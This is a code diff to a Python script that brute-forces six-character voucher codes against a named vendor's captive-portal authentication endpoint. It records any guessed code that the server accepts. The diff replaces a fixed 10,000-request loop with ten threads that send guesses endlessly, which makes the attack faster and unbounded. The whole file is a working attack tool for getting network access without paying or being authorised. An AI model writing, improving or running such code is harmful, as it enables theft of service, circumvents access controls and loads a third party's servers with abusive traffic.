@@ -3,6 +3,7 @@ import random
 import string
 import time
 from urllib.parse import urlparse, parse_qs
+from concurrent.futures import ThreadPoolExecutor
 
 # Define cookies for session handling
 cookies = {
@@ -78,43 +79,45 @@ else:
     print("Invalid choice. Exiting.")
     exit(1)
 
-# Loop to generate and use codes 10000 times
-for i in range(10000):
-    # Generate a random access code based on user choice
-    access_code = ''.join(random.choices(char_range, k=6))
+# Function to send requests
+def send_request(index):
+    while True:  # Infinite loop to keep sending requests
+        access_code = ''.join(random.choices(char_range, k=6))
+        json_data = {
+            'accessCode': access_code,
+            'sessionId': session_id,
+            'apiVersion': 1,
+        }
 
-    # Define the JSON payload
-    json_data = {
-        'accessCode': access_code,
-        'sessionId': session_id,
-        'apiVersion': 1,
-    }
+        try:
+            response = requests.post(
+                'https://portal-as.ruijienetworks.com/api/auth/voucher/',
+                params=params,
+                cookies=cookies,
+                headers=headers,
+                json=json_data,
+                timeout=5
+            )
+            response.raise_for_status()
 
-    # Send the POST request with error handling
-    try:
-        response = requests.post(
-            'https://portal-as.ruijienetworks.com/api/auth/voucher/',
-            params=params,
-            cookies=cookies,
-            headers=headers,
-            json=json_data,
-            timeout=5
-        )
-        response.raise_for_status()
+            print(f"Thread {index}: Access Code: {access_code} - Status: {response.status_code}")
+            print(f"Response Body: {response.text}\n")
 
-        print(f"Request {i + 1}:")
-        print(f"Access Code: {access_code}")
-        print(f"Response Status Code: {response.status_code}")
-        print(f"Response Body: {response.text}\n")
+            # Check if the response contains "true"
+            if "true" in response.text:
+                with open(output_file, "a") as file:
+                    file.write(f"{access_code}\n")
+                print(f"Access code {access_code} saved to {output_file}")
 
-        # Check if the response contains "true"
-        if "true" in response.text:
-            # Save the access code to a file
-            with open(output_file, "a") as file:
-                file.write(f"{access_code}\n")
-            print(f"Access code {access_code} saved to {output_file}\n")
-    except requests.exceptions.RequestException as e:
-        print(f"Request {i + 1} failed: {e}")
+        except requests.exceptions.RequestException as e:
+            print(f"Thread {index} failed: {e}")
 
-    # Delay between requests
-    time.sleep(0.001)
+        time.sleep(0.1)  # Small delay to prevent excessive server load
+
+# Number of threads (Adjust based on system performance)
+num_threads = 10
+
+# Using ThreadPoolExecutor for multi-threading
+with ThreadPoolExecutor(max_workers=num_threads) as executor:
+    for i in range(num_threads):
+        executor.submit(send_request, i)  # Start threads indefinitely
